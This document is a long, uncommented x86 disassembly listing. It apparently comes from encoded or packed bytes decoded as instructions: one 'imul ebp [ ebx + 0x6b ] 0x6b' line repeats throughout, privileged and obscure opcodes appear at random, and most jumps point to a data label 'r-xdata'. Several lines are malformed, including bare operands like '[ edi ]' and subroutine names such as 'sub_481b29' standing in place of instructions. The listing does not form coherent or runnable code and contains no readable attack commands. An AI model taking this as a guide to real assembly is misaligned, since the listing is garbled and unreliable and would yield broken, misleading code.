add eax [ esi ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx - 0x4048405 ] 0x12
or al 0x9
add al 0x4
imul ebp [ ebx + 0x6b ] 0x7e
xor dh ah
jg r-xdata
hlt
mov ebp 0x267ff4fb
or [ esp + eax ] al
js r-xdata
and [ ebp + 0x7005a672 ] bl
and [ ebp - 0x6ea4598e ] ebx
mov [ eax + 0x22 ] dh
popfd
jb r-xdata
mov [ 0x6b3832a2 ] al
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x4
dec esp
aas
sti
sti
sti
adc bh [ edx ]
salc
sti
sti
add al 0x6c
pop edi
sti
sti
sti
enter 0xa53b 0xa0
adc ah [ esi + 0x7604040a ]
jle r-xdata
fucomip st7
sti
adc dh [ esi ]
or [ esp + eax ] al
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
inc edi
pop ecx
adc dh [ edi + 0x6bfbfbe1 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
pop ss
adc ah [ ecx - 0x40 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0x72
mov ss [ edi + 0x70 ]
sub_481b29
[ edi ]
popfd
jb r-xdata
jecxz r-xdata
push ebx
lodsd [ esi ]
adc dl [ ebx + 0x6b04041c ]
imul ebp [ ebx + 0x6b ] 0x76
jbe r-xdata
jb r-xdata
leave
add [ esp + eax ] al
imul ebx [ ebp + 0x7001a672 ] 0x23
popfd
jb r-xdata
adc ebp [ edi + 0x12fbfbf1 ]
mov ebp 0x6bfbfbf1
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp - 0x5ea6518e ] 0xffffff9d
jb r-xdata
push es
add al 0x4
sti
add eax 0x729d2170
cmpsb [ esi ] [ edi ]
pop ebx
xchg ecx eax
imul ebp [ ebx + 0x6b ] 0xffffff93
sti
jpo r-xdata
pop es
enter 0x9d20 0x72
cmpsb [ esi ] [ edi ]
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x17 ] 0x12
popad
sar bl 0xfb
pop ebp
adc bh [ esi + 0x6bfbfbe9 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x13 ] 0x6d
mov [ eax + 0x22 ] dh
popfd
jb r-xdata
and [ ebp + 0x7005a672 ] bl
and [ ebp - 0x6ea4598e ] ebx
inc edi
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0x72
mov ss [ edi + 0x70 ]
pop ecx
adc dh [ edi + 0x6bfbfbe1 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
pop ss
adc ah [ ecx - 0x40 ]
sti
sti
add al 0x4
imul ebp [ ebx + 0x6b ] 0x7e
xor dh ah
jg r-xdata
imul edx [ ebx - 0x4048405 ] 0x12
or al 0x9
sti
adc cl [ ecx + ecx ]
mov eax [ 0x729dca91 ]
out dx eax
jle r-xdata
enter 0x913b 0xd5
popfd
jb r-xdata
popfd
jb r-xdata
scasb [ edi ]
daa
mov eax [ 0x4007a12 ]
add al 0x6b
jo r-xdata
and [ ecx + 0x729dca91 ] esp
adc cl [ ecx + ebx * 8 - 0xb940405 ]
dec esp
mov eax 0x1c2c12e7
add al 0x4
imul eax [ esp + ebp * 4 ] 0xffffffb7
jle r-xdata
popfd
jb r-xdata
jmp 0xffffffff9dd5ad9e
fdivr st3
sti
js r-xdata
imul edx [ ebx ] 0x6d
sbb esp [ eax + 0x729dcd91 ]
xchg [ ebx ] dl
movsb [ edi ] [ esi ]
adc ah [ ebp + 0x6b040413 ]
jle r-xdata
mov al [ 0x729dcd91 ]
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x13
insd
and esi [ eax + 0x2a ]
popfd
jb r-xdata
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
sub_48257d
sti
sti
adc cl [ edx ]
adc al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x78 ] 0x3
mov ebx 0x40bc912
add al 0x6b
jle r-xdata
mov esi 0xbe3c4317
or dl [ ecx + 0x12fb91fb ]
call 0x6c4421a5
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ esi - 0x42 ] 0x5f
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x2d ] 0xffffffc8
cmp edx [ ecx + 0xed5128f ]
pop es
add al 0x4
jbe r-xdata
sti
xchg ebx eax
sti
jpo r-xdata
dec edi
add eax [ esp + eax ]
stosd [ edi ]
jbe r-xdata
adc eax [ edx + 0x7e04041b ]
cmp esi esp
push es
add al 0x4
stosd [ edi ]
enter 0xad0d 0x4
lodsb [ esi ]
mov bh 0x12
dec edi
jbe r-xdata
sti
xchg ecx eax
sti
add al 0x8f
jg r-xdata
pop ss
stosd [ edi ]
jbe r-xdata
inc eax
int1
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x6d ] 0xffffffff
cli
sti
sti
adc ah [ 0x6b040404 ]
test al 0xa8
cmp eax 0x3c4317be
mov esi 0x91fb910a
sti
adc ch al
leave
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x76 ] 0xffffffbe
pop edi
pop edi
adc ebx [ ebp + 0x7e04041b ]
cmp esi esp
jg r-xdata
jecxz r-xdata
aas
pop es
add al 0x4
stosd [ edi ]
adc dh al
or eax 0x3f780404
not [ ebx ]
add al 0x4
jbe r-xdata
pop es
add al 0x4
enter 0x323b 0x38
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0x2d
enter 0x913b 0x8f
adc dl ch
push cs
lodsd [ esi ]
sub_482675
adc cl [ ebx + 0x6 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x76
ja r-xdata
fxch st7
retn 0xdf87
sti
sti
sti
stosb [ edi ]
jbe r-xdata
fstp st7
sti
lodsd [ esi ]
cmp eax 0xfaefdfbf
adc ecx [ edx ]

fbstp [ ebx + 0x729dabaa ]
mov edi 0x6d04a3df
pop ds
sti
sti
sti
xchg ebx eax
sti
jpo r-xdata
sti
xchg ecx eax
sti
add al 0x8f
sub_4826bf
sti
sti
adc ah [ ecx + 0x6bfbfbde ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
scasb [ edi ]
jo r-xdata
imul ebp [ ebx - 0x63 ] 0xffffffc2
hlt
adc dh [ ebx ]
stc
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
retn 0xf4f3
sub_4827d5
sti
js r-xdata
adc ebp [ edx ]
fucomip st7
cli
hlt
inc edi
sti
sti
sti
adc bh [ ebx - 0x1f ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x6f ] 0xffffffde
popfd
jb r-xdata
xchg ecx eax
lahf
pop ss
adc bh [ eax - 0x2d ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ecx eax 0x29
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
popfd
retn 0xf4f3
add al 0x4
jo r-xdata
sbb eax 0x129e91a3
sti
imul esi [ eax - 0x53 ] 0xffffffab
pop es
jo r-xdata
adc ch [ eax + 0x6bfbfbe9 ]
imul ebp [ ebx + 0x13 ] 0x2a
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0xffffffad
stosd [ edi ]
pop es
jo r-xdata
dec esp
mov ebp 0xf84112ef
sti
sti
mov [ 0x729d9591 ] eax
mov esi 0x9e91a31b
popfd
jb r-xdata
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0xffffffc2
hlt
popfd
jb r-xdata
sbb [ ebx + 0x729db291 ] esp
mov esi 0x9f91a31f
sbb al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
js r-xdata
adc bl [ edi - 0x6 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
adc edx [ edx ]
cwde
idiv ebx
sti
imul ebp [ ebx + 0x13 ] 0xffffffa1
enter 0xfbfb 0x78
aas
not [ edx ]
rcr [ esp + eax ] cl
and al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
mov ebp 0xf8c776fb
hlt
sub_4827e4
cli
adc al [ ebx + 0x6b6bfbfb ]
imul ebp [ ebx + 0x6b ] 0x70
dec ebx
inc edi
sti
sti
sti
enter 0xac20 0x7e
or eax 0x4015f12
add al 0x93
test al 0x65
or [ edx + edx + 0x404179d ] ebp
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x72
cmpsb [ esi ] [ edi ]
and edx [ edx ]
push esp
jmp r-xdata
sub_482887
sti
mov ah 0x6
add al 0x4
stc
popfd
js r-xdata
and [ ecx + 0x729dbc91 ] 0xffffffae
popad
and al 0x4
add al 0x4
lea ebp [ edi - 0x417f9ee ]
sti
jle r-xdata
pop ss
sti
hlt
sti
sti
js r-xdata
imul esi esp 0x7f
idiv bl
dec ebx
sti
sti
sti
test al 0xac
add al 0x6d
dec edi
sti
sti
sti
movsb [ edi ] [ esi ]
mov al [ 0x6b6b3832 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ esi + 0x3b ] 0xfffffff4
jg r-xdata
push ecx
adc dh [ esi + eax + 0x6d040404 ]
imul ebp [ ebx + 0x6b ] 0xffffffae
jo r-xdata
adc al cl
sbb [ esp + eax ] eax
imul ebp [ ebx + 0x6b ] 0xffffffc8
cmp esi [ edx ]
cmp [ ebx + 0x6b ] ch
jb r-xdata
add al 0x4
sar [ edx ] 0x1
sub al [ ebx ]
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
xchg ecx eax
aad 0x9d
jb r-xdata
adc bl [ 0x7e6bfbfb ]
xor dh ah
jpe r-xdata
mov eax [ 0x729d8e91 ]
scasb [ edi ]
mov eax [ 0x729d ]
scasb [ edi ]
popfd
jb r-xdata
xchg ecx eax
mov esp 0x61ae729d
pop es
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
jb r-xdata
or [ edx + 0xfb6729d ] esp
jo r-xdata
jo r-xdata
sti
jg r-xdata
in eax 0xfb
xchg edi edi
sti
sti
adc cl [ eax ]
sar bl 0x1
sti
enter 0x700d 0x35
add al 0x6d
daa
sar [ ebp + 0x777ef4cf ] 0xe9
sti
sti
retn 0x7a6
js r-xdata
and edx [ edx ]
push esp
jmp r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0x72
xchg [ edi - 0x5c ] ch
xchg ecx eax
popfd
jb r-xdata
sti
xchg ebx eax
sti
jpo r-xdata
jo r-xdata
jb r-xdata
hlt
jle r-xdata
sub [ eax ] al
js r-xdata
and al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
mov ebp 0xf8c776fb
hlt
mov [ 0x729d9591 ] al
mov dh 0x15
mov [ 0xbb6729d ] al
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul esp [ edx + 0x120370a2 ] 0xffffffbf
cmc
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
mov [ 0x729d9c91 ] al
mov dh 0x11
mov [ 0x729d9291 ] al
mov dh 0x17
add eax ecx
cmp edx [ ecx - 0x418d627d ]
sti
xchg ecx eax
sti
add al 0x8f
fstp st3
add al 0xad
sti
sti
jle r-xdata
pop es
jg r-xdata
hlt
sti
imul edi [ esi + 0x32 ] 0xfffffff4
mov ecx 0xfbe51c12
inc edi
sti
sti
sti
adc bh [ ebx - 0x1f ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x6f ] 0xffffffde
popfd
jb r-xdata
pop es
adc al ch
loope r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x6b
hlt
cmp esi esp
jle r-xdata
pop es
xor bh [ eax ]
imul ebp [ ebx - 0x63 ] 0x78
retn 0xf4db
xchg ecx eax
lahf
pop ss
adc bh [ eax - 0x2d ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ecx eax 0x29
jb r-xdata
sti
sti
sti
jle r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
popfd
retn 0xf4f3
sbb eax 0x129e91a3
sti
imul esi [ eax - 0x53 ] 0xffffffab
pop es
jo r-xdata
jo r-xdata
mov ebx 0x7be72f3
hlt
adc ch [ eax + 0x6bfbfbe9 ]
imul ebp [ ebx + 0x13 ] 0x2a
add al 0x4
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0xffffffad
stosd [ edi ]
pop es
jo r-xdata
dec esp
mov ebp 0xf84112ef
sti
sti
mov [ 0x729d9591 ] eax
mov esi 0x9e91a31b
popfd
jb r-xdata
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0xffffffc2
hlt
popfd
jb r-xdata
sbb [ ebx + 0x729db291 ] esp
mov esi 0x9f91a31f
sbb al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
adc bl [ edi - 0x6 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
adc edx [ edx ]
cwde
idiv ebx
sti
imul ebp [ ebx + 0x13 ] 0xffffffa1
enter 0xfbfb 0x78
aas
not [ edx ]
rcr [ esp + eax ] cl
sub_48298e
adc dl [ ebp + 0x6b040408 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
cmp esi esp
jle r-xdata
pop es
xor bh [ eax ]
imul ebp [ ebx - 0x63 ] 0x78
retn 0xf4db
mov ecx 0xfbe51c12
sti
imul edi [ esi + 0x32 ] 0xfffffff4
jg r-xdata
sti
sti
sti
jle r-xdata
jo r-xdata
sti
mov ebx 0x7be72f3
hlt
sti
xchg ebx eax
sti
jpo r-xdata
jo r-xdata
jb r-xdata
hlt
sti
xchg ecx eax
sti
add al 0x8f
fstp st3
add al 0xad
jle r-xdata
sub [ eax ] al
js r-xdata
sti
sti
jle r-xdata
jo r-xdata
pop es
jg r-xdata
hlt
sub_4829be
xchg ecx eax
cdq
mov [ 0xfffffffffbd26812 ] eax
sti
imul ebp [ ebx - 0x52 ] 0x70
pop ss
adc bl ch
push cs
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ ebx + ecx * 4 ] 0xfffffff3
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ eax + 0x3f ] 0xfffffff7
add al 0x6c
push ebx
sti
adc edi [ eax - 0x28 ]
sti
sti
mov [ 0xffffffffd17c12a2 ] al
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x13
dec ecx
sar [ eax ] 0xf4
or eax [ esp + eax ]
jo r-xdata
imul esi [ esi - 0x42 ] 0x7b
stosd [ edi ]
adc ch [ ecx + 0x6bfbfbfc ]
imul edx [ ecx - 0x518d6273 ] 0x3f
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x76 ] 0xffffffbe
sti
sti
popfd
jb r-xdata
sti
sti
jpo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x78 ] 0x3f
test [ esp + ebp * 2 ] 0xfbfbfb53
test al 0x12
jpe r-xdata
jg r-xdata
cmp ah dh
sub esp [ edx + 0x729d8c91 ]
jb r-xdata
adc ecx esi
out 0xfb eax
sti
jo r-xdata
adc [ esp + eax ] al
mov [ 0xfffffffffbdb0b12 ] al
sti
imul esp [ ebx + 0x729d9e91 ] 0xffffffbe
adc eax 0xff9b12a3
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx ] 0x49
adc cl [ esi + 0x6b6b0404 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jbe r-xdata
aas
sti
lodsb [ esi ]
jbe r-xdata
mov [ 0x7a672a2 ] al
adc cl [ esi ]
or al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul eax eax 0x3c
hlt
mov dh 0x29
mov [ 0xffffffffc2128f91 ] al
mov [ 0x729d8c91 ] al
pop es
stosb [ edi ]
adc ah cl
idiv ebx
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x63 ] 0x72
scasb [ edi ]
aad 0x9d
jb r-xdata
adc [ esp + eax ] eax
imul esi esp 0x7f
pop ss
or al 0x4
add al 0x93
fyl2xp1
inc esp
jno r-xdata

sub_482ae9
mov edi 0xc807be72
and [ edx ] dl
daa
add al 0x4
imul ebp [ ebx - 0x52 ] 0x70
pop ss
js r-xdata
jle r-xdata
out dx eax
adc dh dh
or [ esp + eax ] al
imul ebp [ ebx + 0x6b ] 0x6b
js r-xdata
stosd [ edi ]
hlt
cmp eax 0xfbd4e312
jmp r-xdata
adc ch al
adc eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0xad
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
lodsb [ esi ]
jo r-xdata
adc ah bl
aam 0xfb
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ esi + edi * 4 ] 0x13
mov al 0xad
mov dh 0xb0
adc ah [ eax + 0x6b04040d ]
imul ebp [ ebx + 0x78 ] 0xffffff9f
inc esp
imul edi [ eax - 0x61 ] 0xffffffdf
jmp r-xdata
cmp dh [ eax + 0xa ]
add al 0x28
jo r-xdata
fucomip st3
stosd [ edi ]
js r-xdata
sahf
pop es
sti
jbe r-xdata
fucomip st3
sti
jbe r-xdata
cdq
adc al bl
jmp r-xdata
pop es
stosd [ edi ]
add al 0x2c
js r-xdata
lahf
add al 0x8e
pop es
enter 0x7832 0x3
add al 0xf4
outsb
in al 0x2c
add al 0x4
add al 0x8e
div [ eax - 0x42 ]
add al 0xab
cli
hlt
sub_482b9e
add esp [ eax + 0x6b6b3832 ]
imul ebp [ ebx + 0x6b ] 0xffffffad
jo r-xdata
add al 0xa2
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x4
lodsd [ esi ]
sti
sti
js r-xdata
cmp al 0xbe
adc esi [ eax + 0x12b0b6ad ]
mov al [ 0x6b04040d ]
mov [ 0x7ff43b7e ] al
jbe r-xdata
pop es
stosd [ edi ]
add al 0x8e
adc ecx [ ecx - 0x5dfbfbf7 ]
aam 0xfb
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
lodsb [ esi ]
jo r-xdata
pop es
sti
hlt
cmp dh [ eax + 0xa ]
add al 0x28
jo r-xdata
fucomip st3
stosd [ edi ]
imul ebp [ ebx + 0x78 ] 0xffffff9f
fucomip st3
sti
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ esi + edi * 4 ] 0x13
mov al 0xad
mov dh 0xb0
adc ah [ eax + 0x6b04040d ]
inc esp
adc ch al
adc eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0xad
adc ah bl
sub_4832b0
push ss
add al 0x4
enter 0xba32 0xd0
xor ebp [ eax + esi * 2 + 0x76f7df87 ]
out dx eax
cli
js r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
enter 0x123b 0x62
in al dx
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi esp 0x7f
inc esi
adc al 0x4
add al 0x76
mov dh 0x3f
adc bh [ esi ]
or [ esp + eax ] eax
imul ebp [ ebx + 0x6b ] 0x6b
imul edi [ esi + 0x32 ] 0xfffffff4
jg r-xdata
hlt
sahf
mov [ 0xdbe729d ] eax
xchg ecx eax
mov [ ebx + 0x3be729d ] esp
enter 0x9d3b 0x72
mov esi 0x2f7e7601
push es
add al 0x4
adc ebx edx
and eax [ esp + eax ]
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x12
inc esp
daa
adc ecx [ 0x76fbfbef ]
mov esi 0xbe3dab04
add al 0xfb
adc edi [ ebp - 0x20 ]
sti
sti
stosd [ edi ]
jbe r-xdata
jb r-xdata
or [ ebx + 0xfbe729d ] esp
xchg ecx eax
xchg edx eax
popfd
jb r-xdata
xchg ecx eax
add al 0xab
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
hlt
sti
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp - 0x5cf4418e ] 0xffffff91
adc esp [ ecx + 0x729d8991 ]
scasb [ edi ]
adc [ edx ] edx
and [ esp + eax ] dl
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x12 ] 0x44
test al 0x8
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
hlt
das
push es
add al 0x4
stosd [ edi ]
adc ecx [ esi + 0x2 ]
add al 0x4
js r-xdata
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0xb ] 0xffffffd0
or bh [ eax + 0x3a ]
stc
adc al [ ebx - 0xd ]
sti
sti
imul eax [ esp + ebp * 2 ] 0x7b
sti
sti
sti
add al 0x8d
stosd [ edi ]
jb r-xdata
jmp r-xdata
jg r-xdata
push gs
stosd [ edi ]
adc ch [ eax + 0x6b040408 ]
imul ebp [ ebx + 0x6b ] 0xfffffff4
jge r-xdata
out 0xfb eax
sti
adc esi [ eax - 0xf ]
sti
sti
adc dh al
imul eax [ esp + ebp * 2 ] 0x7f
sti
sti
sti
enter 0x123b 0x3d
jo r-xdata
fdivp st3
sti
adc dh bh
or al 0x4
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffa5
add esi [ eax + 0x7b ]
pop edi
sti
sti
sti
js r-xdata
imul ebp [ ebx - 0xc ] 0x7d
inc eax
iretd
adc ebx ebx
[ edi ]
add al 0x8e
pop ds
adc cl [ ebp + 0x6b040414 ]
imul ebp [ ebx + 0x6b ] 0x6b
clc
mov esi 0x3be72eb
jo r-xdata
mov al [ 0x6b6b3832 ]
enter 0xa53b 0xa0
xor bh [ eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jbe r-xdata
movsd [ edi ] [ esi ]
pop es
adc bl [ ebx + 0x6b040412 ]
adc ebx [ ebp - 0x15 ]
sti
sti
jle r-xdata
imul edx [ edx ] 0x3b
out dx al
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffab
add al 0x8e
pop ds
adc ch [ eax + 0x6b040412 ]
jo r-xdata
hlt
jle r-xdata
mov [ 0x4fa6729d ] al
jo r-xdata
mov ebx 0x6b6b3832
adc dl [ eax ]
idiv bl
sti
jo r-xdata
sti
adc al [ edx ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi esp 0x7f
mov bh 0x2d
add al 0x4
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add al 0x6c
pop edi
sti
sti
sti
adc cl bh
add eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x76 ] 0x7e
inc edi
add [ esp + eax ] eax
stosd [ edi ]
add al 0xad
xlat
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ecx eax 0x3b
adc al [ ebx + 0x35 ]
add al 0x4
add al 0x8e
or ebp [ edx + edx + 0x4041df5 ]
imul ebx [ ebp + 0x70c5ae72 ] 0x3
jo r-xdata
test al 0x12
pop esi
xor eax [ esi ]
add al 0x4
stosd [ edi ]
add al 0xad
lahf
fdivp st3
sti
xchg ecx eax
jmp r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
